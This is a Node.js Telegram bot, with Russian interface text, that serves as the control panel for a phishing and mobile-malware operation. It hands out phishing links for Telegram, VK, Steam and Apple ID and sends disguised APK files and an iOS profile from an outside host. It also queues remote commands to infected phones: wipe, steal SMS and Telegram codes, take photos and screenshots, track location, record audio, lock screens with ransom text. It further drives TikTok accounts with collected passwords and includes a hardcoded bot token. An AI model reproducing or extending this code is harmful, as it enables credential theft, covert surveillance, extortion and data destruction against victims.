const { Telegraf, Markup } = require('telegraf');
const db = require('./db');
const axios = require('axios');

const BOT_TOKEN = '9001719911:AAGHKT0b4BdSPdX8yGzaXKTmNdBEL7IFYro';
const ADMIN_ID  = 9256345316;

const bot = new Telegraf(BOT_TOKEN);
const awaiting = {};

function isAdmin(ctx) {
  return ctx.from && ctx.from.id === ADMIN_ID;
}

function getMainMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback('📦 Сделать файл', 'make_file')],
    [Markup.button.callback('📱 Мои устройства', 'my_devices')],
    [Markup.button.callback('🎣 Фиш ссылки', 'phish_links')],
    [Markup.button.callback('🔥 Прогрев TikTok', 'warmup_start')],
    [Markup.button.callback('📹 Залить видео', 'upload_start')],
    [Markup.button.callback('🚀 Запуск', 'spam_start')]
  ]);
}

bot.start((ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.reply("Приветствую тебя в нашем боте.", getMainMenu());
});

bot.action('back_start', (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.editMessageText("Главное меню", getMainMenu());
});

// --- ЗАЛИВКА ВИДЕО ---
bot.action('upload_start', (ctx) => {
  if (!isAdmin(ctx)) return;
  awaiting[ctx.from.id] = { type: 'await_upload_creds' };
  ctx.editMessageText("Скиньте данные от аккаунта в формате:\n`почта;пароль`", { parse_mode: 'Markdown' });
});

// --- ПРОГРЕВ ---
bot.action('warmup_start', (ctx) => {
  if (!isAdmin(ctx)) return;
  awaiting[ctx.from.id] = { type: 'await_creds' };
  ctx.editMessageText("Скиньте данные от аккаунта в формате:\n`почта;пароль`", { parse_mode: 'Markdown' });
});

bot.action(/^warmup_time:(.+)$/, (ctx) => {
  if (!isAdmin(ctx)) return;
  const timeStr = ctx.match[1];
  const s = awaiting[ctx.from.id];
  if (!s || !s.creds) return ctx.reply("Ошибка. Начните заново.");

  let durationMs = 0;
  if (timeStr === '10m') durationMs = 10 * 60 * 1000;
  if (timeStr === '30m') durationMs = 30 * 60 * 1000;
  if (timeStr === '60m') durationMs = 60 * 60 * 1000;
  if (timeStr === '120m') durationMs = 120 * 60 * 1000;
  if (timeStr === '24h') durationMs = 24 * 60 * 60 * 1000;

  const [email, password] = s.creds.split(';');
  delete awaiting[ctx.from.id];

  ctx.editMessageText(`Запускаю прогрев на ${timeStr}...`);

  const { warmupTikTok } = require('./tiktok');
  
  const updateMsg = async (stats) => {
      try {
          await ctx.telegram.editMessageText(ctx.chat.id, ctx.callbackQuery.message.message_id, null,
              `🔥 Прогрев идёт...\n👍 Лайков: ${stats.likes}\n👀 Просмотров: ${stats.views}`);
      } catch (e) {}
  };

  warmupTikTok(email, password, durationMs, updateMsg).then(finalStats => {
    if (finalStats.error) return ctx.reply("❌ Ошибка: " + finalStats.error);
    const hours = Math.floor(durationMs / 3600000);
    const mins = Math.floor((durationMs % 3600000) / 60000);
    ctx.reply(`✅ Прогрев окончен!\nВремя: ${hours}ч ${mins}м\n\n📊 Статистика:\n👍 Лайков: ${finalStats.likes}\n👀 Просмотров: ${finalStats.views}`);
  }).catch(err => {
    ctx.reply("Ошибка: " + err.message);
  });
});

// --- ФИШ ССЫЛКИ ---
bot.action('phish_links', (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.editMessageText("Выберите платформу:", Markup.inlineKeyboard([
    [Markup.button.callback('Telegram', 'phish_tg'), Markup.button.callback('ВКонтакте', 'phish_vk')],
    [Markup.button.callback('Steam', 'phish_steam'), Markup.button.callback('Apple ID', 'phish_ios')],
    [Markup.button.callback('« Назад', 'back_start')]
  ]));
});

bot.action('phish_tg', (ctx) => { if (!isAdmin(ctx)) return; ctx.editMessageText("Ссылка:\nhttps://tnt.de3.netrun.io/tg.html"); });
bot.action('phish_vk', (ctx) => { if (!isAdmin(ctx)) return; ctx.editMessageText("Ссылка:\nhttps://tnt.de3.netrun.io/vk.html"); });
bot.action('phish_steam', (ctx) => { if (!isAdmin(ctx)) return; ctx.editMessageText("Ссылка:\nhttps://tnt.de3.netrun.io/steam.html"); });
bot.action('phish_ios', (ctx) => { if (!isAdmin(ctx)) return; ctx.editMessageText("Ссылка:\nhttps://tnt.de3.netrun.io/ios.mobileconfig"); });

// --- ФАЙЛЫ ---
bot.action('make_file', (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.editMessageText("На какое устройство?", Markup.inlineKeyboard([
    [Markup.button.callback('Андройд', 'os_android'), Markup.button.callback('Айфон', 'os_ios')],
    [Markup.button.callback('« Назад', 'back_start')]
  ]));
});

bot.action('os_android', (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.editMessageText("Какой файл?", Markup.inlineKeyboard([
    [Markup.button.callback('TikTok', 'file_tt'), Markup.button.callback('Telegram', 'file_tg')],
    [Markup.button.callback('cheat', 'file_ch')],
    [Markup.button.callback('« Назад', 'make_file')]
  ]));
});

bot.action('os_ios', (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.editMessageText("Какой файл?", Markup.inlineKeyboard([
    [Markup.button.callback('TikTok', 'link_tt'), Markup.button.callback('Telegram', 'link_tg')],
    [Markup.button.callback('cheat', 'link_ch')],
    [Markup.button.callback('« Назад', 'make_file')]
  ]));
});

bot.action(/^file_(tt|tg|ch)$/, async (ctx) => {
  if (!isAdmin(ctx)) return;
  const type = ctx.match[1];
  ctx.answerCbQuery('Отправляю...');
  let fileName = type === 'tt' ? 'tiktok.apk' : type === 'tg' ? 'telegram.apk' : 'cheat.apk';
  try {
    await ctx.replyWithDocument({ url: `https://tnt.de3.netrun.io/${fileName}`, filename: fileName });
  } catch (e) { ctx.reply('Ошибка: файл не найден.'); }
});

bot.action(/^link_(tt|tg|ch)$/, (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.answerCbQuery();
  ctx.reply(`Ссылка для iOS:\nhttps://tnt.de3.netrun.io/ios.mobileconfig`);
});

// --- УСТРОЙСТВА ---
bot.action('my_devices', (ctx) => {
  if (!isAdmin(ctx)) return;
  const list = db.listDevices();
  if (!list.length) return ctx.editMessageText('Ваши устройства:\n(пока пусто)', Markup.inlineKeyboard([[Markup.button.callback('« Назад', 'back_start')]]));
  const rows = list.map(d => ([Markup.button.callback(`${d.model || 'device'} · ${d.id.slice(0,6)}`, `dev:${d.id}`)]));
  rows.push([Markup.button.callback('« Назад', 'back_start')]);
  ctx.editMessageText('Ваши устройства:', Markup.inlineKeyboard(rows));
});

bot.action(/^dev:(.+)$/, (ctx) => {
  if (!isAdmin(ctx)) return;
  const id = ctx.match[1];
  ctx.editMessageText('Что сделать?', Markup.inlineKeyboard([
    [Markup.button.callback('💥 Снести', `cmd:${id}:wipe`), Markup.button.callback('🔊 Стоны', `cmd:${id}:audio`)],
    [Markup.button.callback('🔥 Сжечь', `cmd:${id}:burn`), Markup.button.callback('💬 Текст', `cmd:${id}:text`)],
    [Markup.button.callback('🔑 Код', `cmd:${id}:sms`), Markup.button.callback('📷 Фото', `cmd:${id}:photo`)],
    [Markup.button.callback('📸 Скрин', `cmd:${id}:screen`), Markup.button.callback('📍 Гео', `cmd:${id}:location`)],
    [Markup.button.callback('🎤 Микрофон', `cmd:${id}:mic`), Markup.button.callback('🖼 Галерея', `cmd:${id}:files`)],
    [Markup.button.callback('🔦 Фонарик', `cmd:${id}:flash`), Markup.button.callback('📞 TG Номер', `cmd:${id}:tg_number`)],
    [Markup.button.callback('💬 TG Код', `cmd:${id}:tg_code`), Markup.button.callback('🎁 NFT', `cmd:${id}:nft`)],
    [Markup.button.callback('🔒 Блок', `cmd:${id}:block`), Markup.button.callback('🔓 Разблок', `cmd:${id}:unblock`)],
    [Markup.button.callback('« Назад', 'my_devices')]
  ]));
});

bot.action(/^cmd:([^:]+):(.+)$/, (ctx) => {
  if (!isAdmin(ctx)) return;
  const [, id, action] = ctx.match;
  
  if (action === 'text') { awaiting[ctx.from.id] = { type: 'await_text', deviceId: id }; return ctx.reply('Что писать?'); }
  if (action === 'block') { awaiting[ctx.from.id] = { type: 'await_block_text', deviceId: id }; return ctx.reply('Текст на экране?'); }
  if (action === 'nft') { awaiting[ctx.from.id] = { type: 'await_nft_user', deviceId: id }; return ctx.reply('Куда скинуть? @username'); }
  
  db.queueCommand(id, action, '');
  ctx.answerCbQuery('Отправлено');
});

// --- СПАМ ---
bot.action('spam_start', (ctx) => {
  if (!isAdmin(ctx)) return;
  awaiting[ctx.from.id] = { type: 'await_city' };
  ctx.editMessageText('По какому городу запустить?');
});

// --- ОБРАБОТКА ТЕКСТА ---
bot.on('text', async (ctx) => {
  if (!isAdmin(ctx)) return;
  const s = awaiting[ctx.from.id];
  
  if (s && s.type === 'await_upload_creds') {
    if (!ctx.message.text.includes(';')) return ctx.reply("Неверный формат! Нужно почта;пароль");
    awaiting[ctx.from.id] = { type: 'await_upload_video', creds: ctx.message.text };
    return ctx.reply("Теперь скиньте видео (файлом или ссылкой).");
  }

  if (s && s.type === 'await_upload_video' && ctx.message.text.startsWith('http')) {
    awaiting[ctx.from.id] = { type: 'await_upload_desc', creds: s.creds, videoUrl: ctx.message.text };
    return ctx.reply("Теперь напишите описание для видео.");
  }

  if (s && s.type === 'await_upload_desc') {
    delete awaiting[ctx.from.id];
    ctx.reply("Начинаю загрузку видео в TikTok...");
    
    const { uploadTikTokVideo } = require('./tiktok');
    const [email, password] = s.creds.split(';');
    
    try {
        const videoRes = await axios.get(s.videoUrl, { responseType: 'arraybuffer' });
        const videoBuffer = Buffer.from(videoRes.data);
        
        const res = await uploadTikTokVideo(email, password, videoBuffer, ctx.message.text);
        if (res.error) ctx.reply("❌ " + res.error);
        else ctx.reply(`✅ Видео загружено!\nСсылка: ${res.url}`);
    } catch (e) {
        ctx.reply("Ошибка скачивания видео: " + e.message);
    }
    return;
  }

  if (s && s.type === 'await_creds') {
    if (!ctx.message.text.includes(';')) return ctx.reply("Неверный формат! Нужно почта;пароль");
    awaiting[ctx.from.id] = { type: 'await_time', creds: ctx.message.text };
    return ctx.reply("На сколько запустить прогрев?", Markup.inlineKeyboard([
      [Markup.button.callback('10 минут', 'warmup_time:10m'), Markup.button.callback('30 минут', 'warmup_time:30m')],
      [Markup.button.callback('60 минут', 'warmup_time:60m'), Markup.button.callback('120 минут', 'warmup_time:120m')],
      [Markup.button.callback('24 часа', 'warmup_time:24h')]
    ]));
  }

  if (s && s.type === 'await_text') { db.queueCommand(s.deviceId, 'msg', ctx.message.text); delete awaiting[ctx.from.id]; return ctx.reply('Текст отправлен.'); }
  if (s && s.type === 'await_block_text') { db.queueCommand(s.deviceId, 'block', ctx.message.text); delete awaiting[ctx.from.id]; return ctx.reply('Экран заблокирован.'); }
  if (s && s.type === 'await_nft_user') { delete awaiting[ctx.from.id]; return ctx.reply('❌ Недостаточно звезд.'); }
  if (s && s.type === 'await_city') { awaiting[ctx.from.id] = { type: 'await_spam_text', city: ctx.message.text }; return ctx.reply('Какой текст?'); }
  if (s && s.type === 'await_spam_text') { delete awaiting[ctx.from.id]; return ctx.reply(`🚀 Запуск: ${s.city} / ${ctx.message.text}`); }
});

// Обработка видео файлом
bot.on('video', async (ctx) => {
    if (!isAdmin(ctx)) return;
    const s = awaiting[ctx.from.id];
    if (s && s.type === 'await_upload_video') {
        const fileId = ctx.message.video.file_id;
        const fileLink = await ctx.telegram.getFileLink(fileId);
        awaiting[ctx.from.id] = { type: 'await_upload_desc', creds: s.creds, videoUrl: fileLink.href };
        return ctx.reply("Видео получено. Теперь напишите описание.");
    }
});

bot.launch();
console.log('bot up');

module.exports = {
  bot,
  notifyAdmin: async (kind, buf, cap) => {
    if (!ADMIN_ID) return;
    if (kind === 'photo') await bot.telegram.sendPhoto(ADMIN_ID, { source: buf }, { caption: cap });
  }
};
